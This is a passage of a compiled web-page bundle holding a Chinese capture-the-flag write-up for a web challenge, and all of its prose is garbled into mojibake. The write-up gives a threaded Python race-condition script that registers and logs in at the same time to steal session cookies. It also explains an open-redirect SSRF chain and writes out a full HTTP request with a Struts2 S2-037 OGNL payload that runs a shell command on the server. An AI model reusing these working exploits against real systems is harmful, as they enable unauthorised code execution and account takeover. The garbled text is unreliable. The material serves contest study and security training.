"),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/35.png",alt:"35"}})]),t._v(" "),a("p",[t._v("æˆ‘ä»¬éœ€è¦ä¿®æ”¹æœ¬åœ°hostï¼Œå°† "),a("code",[t._v("where_is_my_cat.ichunqiu.com")]),t._v(" æŒ‡å‘é¢˜ç›®åœ°å€ã€‚åœ¨COOKIEä¸­è¿˜ä¼šçœ‹åˆ°HOSTå­—æ®µï¼Œä¹ŸæŠŠå®ƒè®¾ç½®æˆ "),a("code",[t._v("where_is_my_cat.ichunqiu.com")]),t._v(" ï¼Œç„¶åå°±å¯ä»¥æ­£å¸¸è®¿é—®ç½‘ç«™äº†ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/36.png",alt:"36"}})]),t._v(" "),a("p",[t._v("æˆ‘ä»¬ä¼šå‘ç°ç½‘ç«™åº•éƒ¨æœ‰ä¸€ä¸ª/source_code_version_1.tgz ï¼Œä¸‹ä¸‹æ¥å®¡è®¡ã€‚è¿™é‡Œä¸»è¦å‘ç°ä¸¤ä¸ªæ¼æ´ç‚¹ã€‚Â ")]),t._v(" "),a("h3",{attrs:{id:"ç¬¬ä¸€ä¸ªç‚¹ï¼šç«äº‰æ¼æ´"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ç¬¬ä¸€ä¸ªç‚¹ï¼šç«äº‰æ¼æ´"}},[t._v("#")]),t._v(" ç¬¬ä¸€ä¸ªç‚¹ï¼šç«äº‰æ¼æ´")]),t._v(" "),a("p",[t._v("é¦–å…ˆæˆ‘ä»¬çœ‹ä¸‹é¢æ³¨å†Œå’Œç™»å½•ä¸¤æ®µä»£ç ï¼Œæ³¨å†Œçš„æ—¶å€™ä¼šæ‰§è¡Œä¸¤æ¡SQLè¯­å¥ï¼Œå…¶ä¸­ä¸€æ¡ä¼šå°†lockedå­—æ®µè®¾ç½®ä¸º1ã€‚è€Œç™»å½•çš„æ—¶å€™ï¼Œä¼šåˆ¤æ–­ç”¨æˆ·æ‰€å¯¹åº”çš„lockedå­—æ®µã€‚å¦‚æœä¸º1ï¼Œåˆ™è¡¨ç¤ºç”¨æˆ·è¢«é”å®šå¹¶ç›´æ¥é€€å‡ºç¨‹åºã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/37.png",alt:"37"}})]),t._v(" "),a("p",[t._v("è¿™æ ·çœ‹æ¥ï¼Œå¥½åƒæˆ‘ä»¬å³ä½¿æ³¨å†Œäº†ç”¨æˆ·ï¼Œä¹Ÿæ— æ³•ç™»å½•è¿›å»ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å¼€å¯å¤šä¸ªçº¿ç¨‹åŒæ—¶æ³¨å†Œç™»å½•ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ç™»å½•è¿›å»ï¼Œè¿™å°±åˆ©ç”¨äº†ç«äº‰æ¼æ´ã€‚æˆ‘ä»¬åœ¨å¯¹æ•°æ®è¿›è¡Œå¢åˆ æ”¹çš„æ—¶å€™ï¼Œè¦ç»™å®ƒåŠ ä¸€æŠŠé”ï¼Œé¿å…æ­¤æ—¶ç”¨æˆ·è¯»åˆ°è„æ•°æ®ï¼ˆæœ¬è¯¥è¯»å–ä¿®æ”¹åçš„å€¼ï¼Œå´è¯»å–äº†ä¿®æ”¹å‰çš„å€¼ï¼‰ã€‚å…³äºç«äº‰æ¼æ´çš„è§£é‡Šï¼Œè¿˜å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š "),a("a",{attrs:{href:"https://seaii-blog.com/index.php/2017/04/26/49.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://seaii-blog.com/index.php/2017/04/26/49.html"),a("OutboundLink")],1)]),t._v(" "),a("p",[t._v("è€Œä¸Šé¢çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šçº¿ç¨‹çš„æ–¹å¼ï¼ŒåŒæ—¶è¿›è¡Œæ³¨å†Œå’Œç™»å½•ï¼Œåœ¨æ‰§è¡Œupdate lockedä¹‹å‰æŸ¥è¯¢ç”¨æˆ·çš„ locked å­—æ®µï¼Œï¼Œä»è€Œæ‹¿åˆ°ç”¨æˆ·çš„cookieä¿¡æ¯ã€‚å…·ä½“ä»£ç å¦‚ä¸‹ï¼š")]),t._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" requests"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("time\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" threading"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("random\nreg_url "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"https://where_is_my_cat.ichunqiu.com:8006/checkregister.php"')]),t._v("\nlog_url "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"https://where_is_my_cat.ichunqiu.com:8006/checklogin.php"')]),t._v("\ncookies "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"HOST"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"where_is_my_cat.ichunqiu.com"')]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("register")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("username"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("password"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    data "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"username"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" username"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"password"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" password"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"code"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("int")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("time"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("time"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    r "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" requests"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("reg_url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" data"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" cookies"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("cookies"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" verify"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("False")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("def")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("login")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("username"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("password"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    data "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"username"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" username"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n        "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"password"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" password"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n    s "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" requests"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("session"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    r "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("post"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("log_url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" data"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" cookies"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("cookies"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" verify"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("False")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"===============================================================\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("r"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookies"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"===============================================================\\n\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("while")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token boolean"}},[t._v("True")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("\n    username "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"moch33"')]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("random"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("randint"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("100000")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    threading"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Thread"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("target"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("register"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" args"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("username"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"mochazz"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("start"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n    threading"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("Thread"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("target"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("login"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" args"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("username"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"mochazz"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("start"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br"),a("span",{staticClass:"line-number"},[t._v("14")]),a("br"),a("span",{staticClass:"line-number"},[t._v("15")]),a("br"),a("span",{staticClass:"line-number"},[t._v("16")]),a("br"),a("span",{staticClass:"line-number"},[t._v("17")]),a("br"),a("span",{staticClass:"line-number"},[t._v("18")]),a("br"),a("span",{staticClass:"line-number"},[t._v("19")]),a("br"),a("span",{staticClass:"line-number"},[t._v("20")]),a("br"),a("span",{staticClass:"line-number"},[t._v("21")]),a("br"),a("span",{staticClass:"line-number"},[t._v("22")]),a("br"),a("span",{staticClass:"line-number"},[t._v("23")]),a("br"),a("span",{staticClass:"line-number"},[t._v("24")]),a("br"),a("span",{staticClass:"line-number"},[t._v("25")]),a("br"),a("span",{staticClass:"line-number"},[t._v("26")]),a("br"),a("span",{staticClass:"line-number"},[t._v("27")]),a("br"),a("span",{staticClass:"line-number"},[t._v("28")]),a("br")])]),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/38.png",alt:"38"}})]),t._v(" "),a("h3",{attrs:{id:"ç¬¬äºŒä¸ªç‚¹ï¼šssrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ç¬¬äºŒä¸ªç‚¹ï¼šssrf"}},[t._v("#")]),t._v(" ç¬¬äºŒä¸ªç‚¹ï¼šSSRF")]),t._v(" "),a("p",[t._v("åœ¨market.phpæ–‡ä»¶ä¸­ï¼Œæœ‰ä¸€å¤„é‡å®šå‘ï¼Œæˆ‘ä»¬åªéœ€è¦ç»•è¿‡is_catå‡½æ•°ä¸­çš„è§„åˆ™ï¼Œå³å¯åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½è¿›è¡ŒSSRFã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/39.png",alt:"39"}})]),t._v(" "),a("p",[t._v("è€Œä¸”redirect.phpä¸­è¿˜å­˜åœ¨ä¸€ä¸ªé‡å®šå‘ï¼Œåˆšå¥½å¯ä»¥ç»“åˆç»•è¿‡ä¸Šé¢çš„è§„åˆ™é™åˆ¶ã€‚è§„åˆ™è¦æ±‚urlä»¥å›¾ç‰‡æ ¼å¼ç»“å°¾ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ "),a("code",[t._v("?ã€#ã€&")]),t._v(" ç­‰ç­‰ç¬¦å·æ¥ç»•è¿‡ã€‚")]),t._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[t._v("// redirect.php\n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("isset")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'u'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("header")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"Location: "')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'u'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('".php"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$log")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("date")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"Y-m-d H:i:s"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('" : "')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_SERVER")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("REMOTE_ADDR")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('" redirect to: "')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[t._v("'u'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('".php\\n\\r"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("file_put_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"log.txt"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$log")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token constant"}},[t._v("FILE_APPEND")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("else")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("header")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[t._v('"Location: index.php"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br")])]),a("p",[t._v("æ¥ä¸‹æ¥å¯ä»¥å¼€å§‹æ¢æµ‹ä¸€æ³¢å¸¸ç”¨ç«¯å£ï¼Œçœ‹çœ‹ä¸Šé¢æœ‰æ²¡å…¶ä»–webæœåŠ¡ï¼Œç„¶åä¼šå‘ç°8080ç«¯å£ä¸Šè¿è¡Œè¿™tomcat+struts2ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/40.png",alt:"40"}})]),t._v(" "),a("p",[t._v("æµ‹ä¸€ä¸‹Strutsçš„æ¼æ´ï¼Œå‘ç°S2-037å¯ç”¨ã€‚")]),t._v(" "),a("p",[a("img",{attrs:{src:"/img/2019%E7%A5%9E%E7%9B%BE%E6%9D%AF%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/41.png",alt:"41"}})]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token request-line"}},[a("span",{pre:!0,attrs:{class:"token property"}},[t._v("GET")]),t._v(" /market.php?url=https://where_is_my_cat.ichunqiu.com/redirect.php%3Fu%3Dhttp%253A//127.0.0.1%253A8080/struts2-rest-showcase/orders/3/%2528%252523_memberAccess%25253d%2540ognl.OgnlContext%2540DEFAULT_MEMBER_ACCESS%2529%25253f%2528%252523wr%25253d%252523context%25255b%252523parameters.obj%25255b0%25255d%25255d.getWriter%2528%2529%252C%252523rs%25253d%2540org.apache.commons.io.IOUtils%2540toString%2528%2540java.lang.Runtime%2540getRuntime%2528%2529.%252565%252578%252565%252563%2528%252523parameters.command%255B0%255D%2529.getInputStream%2528%2529%2529%252C%252523wr.println%2528%252523rs%2529%252C%252523wr.flush%2528%2529%252C%252523wr.close%2528%2529%2529%253Axx.toString.json%253F%2526obj%253Dcom.opensymphony.xwork2.dispatcher.HttpServletResponse%2526content%253D233%2526command%253Dcat%252520/flag%2526%23mochazz.jpg HTTP/1.1")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Host:")]),t._v(" where_is_my_cat.ichunqiu.com:8006\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Cookie:")]),t._v(" PHPSESSID=fkotbsvfhbdrfbjotnhbtriuq0; HOST=where_is_my_cat.ichunqiu.com\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])])])}),[],!1,null,null,null);s.default=e.exports}}]);